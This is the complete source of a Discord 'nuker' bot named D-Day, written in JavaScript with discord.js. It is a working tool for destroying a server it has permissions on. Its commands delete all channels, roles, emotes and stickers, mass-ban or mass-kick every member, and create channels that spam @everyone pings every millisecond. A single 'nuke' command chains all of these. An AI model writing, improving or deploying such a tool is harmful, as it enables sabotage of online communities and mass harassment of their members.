/**
 * D-Day By: ΞχSΡΙRΔνΙΓ 
 * @author ΞχSΡΙRΔνΙΓ
 */

 const { Client, Intents, MessageEmbed } = require("discord.js");
 const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
 const { red, greenBright, cyan, yellow } = require("chalk");
 const { Token, prefix, userID, disableEveryone } = require("../config/config.json")
 

nuker.on("ready", () => {
    console.clear();
    console.log(red(`
    
                                                   



 
	██████╗       ██████╗  █████╗ ██╗   ██╗
	██╔══██╗      ██╔══██╗██╔══██╗╚██╗ ██╔╝
	██║  ██║█████╗██║  ██║███████║ ╚████╔╝ 
	██║  ██║╚════╝██║  ██║██╔══██║  ╚██╔╝  
	██████╔╝      ██████╔╝██║  ██║   ██║   
	╚═════╝       ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
                                       
 
                                    
                                    

                                                 
                                                 
                                                 

                    Nuker: ${nuker.user.tag}
                    Prefix: ${prefix}
    `))
    nuker.user.setActivity({ name: "D-DAY", type: "PLAYING" });
});

nuker.on("messageCreate", (message) => {

    // Help Embed
    const help = new MessageEmbed()
        .setDescription(`**D-DAY ;**
    \n**Mass create channels ;**
    ${prefix}mc [amount] (text) i.e \`${prefix}mc 13 test\`\n
    **Mass create channels & ping everyone ;**
    ${prefix}cp [amount] (text), {message} i.e \`${prefix}cp 13 test, testing\`\n
    **Mass create roles ;**
    ${prefix}mr [amount] (text) i.e \`${prefix}mr 13 test\`\n
    **Delete all channels ;**
    ${prefix}dc\n
    **Delete all roles ;**
    ${prefix}dr\n
    **Delete all emotes ;**
    ${prefix}de\n
    **Delete all stickers ;**
    ${prefix}ds\n
    **Mass kick member ;**
    ${prefix}mk\n
    **Mass ban members ;**
    ${prefix}mb\n
    **Mass ban, delete roles, stickers, emotes, and channels ;**
    ${prefix}nuke
    `)
        .setFooter(`© D-DAY`)
        .setColor(0x36393E)
        .setTimestamp(Date.now());

    // Perms
    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "Permission.FLAGS.ADMINISTRATOR");

    // Possible Args
    let invalidID = ("You are not authorized to use any of this tools commands.")
    let args = message.content.split(" ").slice(1);
    var args1 = args[0]; // Amount
    var args2 = args.slice(1).join(' ') // Naming
    var args3 = args.slice(2).join(', '); // Other

    // Commands
    const arrcommands = ["help","mc","dc","cp","mr","dr","ds","de","mb","mk","nuke"]

    if (!disableEveryone) {
        runCommands(false);
    } else {
        runCommands(true);
    }
    
    function runCommands(TOF) {
        for (let i = 0; i < arrcommands.length; i++) {
            if (message.content.startsWith(prefix + arrcommands[i])) {
                if (TOF) {
                    if (message.author.id != userID) return message.reply(invalidID);
                }
                switch(i) {
                    case 0:message.channel.send({embeds: [help]})
                    break;
                    case 1:massChannels(args1, args2).catch((err) => {message.reply(err);});
                    break;
                    case 2:delAllChannels().catch((err) => {message.reply(err);});
                    break;
                    case 3:massChnPing(args1, args2, args3).catch((err) => {message.reply(err);});
                    break;
                    case 4:massRoles(args1, args2).catch((err) => {message.reply(err);});
                    break;
                    case 5:delAllRoles().catch((err) => {message.reply(err);});
                    break;
                    case 6:delAllStickers().catch((err) => {message.reply(err);});
                    break;
                    case 7:delAllEmotes().catch((err) => {message.reply(err);});
                    break;
                    case 8:banAll().catch((err) => {message.reply(err);});
                    break;
                    case 9:kickAll().catch((err) => {message.reply(err);});
                    break;
                    case 10:Nuke()
                    break;

                }
            }
        }
    }

    // Nuking Functions

    /**
     * Mass creates channels
     * @param {number} amount Amount of channels to mass create
     * @param {string} channelName Name of channel
     */
    function massChannels(amount, channelName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify the amount of channels to create");
            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
            if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`Nuked By ${message.author.username}`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
                }
            }
            resolve();
        });
    }

    /**
     * Mass creates channels and ping's everyone
     * @param {number} amount Amount of channels to create
     * @param {string} channelName Name of channel
     * @param {string} pingMessage Message to be sent
     */
    function massChnPing(amount, channelName, pingMessage) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify the amount of channels to create");
            if (isNaN(amount)) return reject("Type Error: Use a number for the amount");
            if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
            if (!pingMessage) return reject("Unspecified Args: Specify the message you wish to mass mention");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1);
                    });
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1);
                    });
                }
            }
            resolve();
        });
    }

    /**
     * Delete all channels
     */
    function delAllChannels() {
        return new Promise((resolve, reject) => {
            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
            resolve();
        });
    }

    /**
     * Mass create roles
     * @param {number} amount Amount of roles
     * @param {string} roleName Role name
     */
    function massRoles(amount, roleName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify the amount of roles to create");
            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
            if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                if (!roleName) {
                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
                } else {
                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
                }
            }
        })
    }

    /**
     * Deletes all roles
     */
    function delAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
        });
    }

    /**
     * Deletes all emotes
     */
    function delAllEmotes() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
        });
    }

    /**
     * Deletes all stickers
     */
    function delAllStickers() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
        });
    }

    /**
     * Ban all guild Members
     */
    function banAll() {
        return new Promise((resolve, reject) => {
            if (!banPerms) return reject("Bot Missing Permissions: 'BAN_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Banning...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.ban().catch((err) => { console.log(red("Error Found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was banned.`)) });
                    }
                }, 1000);
            })
        })
    }

    /**
     * Kick all guild Members
     */
    function kickAll() {
        return new Promise((resolve, reject) => {
            if (!kickPerms) return reject("Bot Missing Permissions: 'KICK_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Kicking...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.kick().catch((err) => { console.log(red("Error Found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was kicked.`)) });
                    }
                }, 1000);
            })
        })
    }

    /**
     * Delete all roles, channels, emotes and stickers, and ban all guild members
     */
    function Nuke() {
        delAllRoles();
        delAllEmotes();
        delAllStickers();
        delAllChannels();
        banAll();
    }
});

nuker.login(Token);
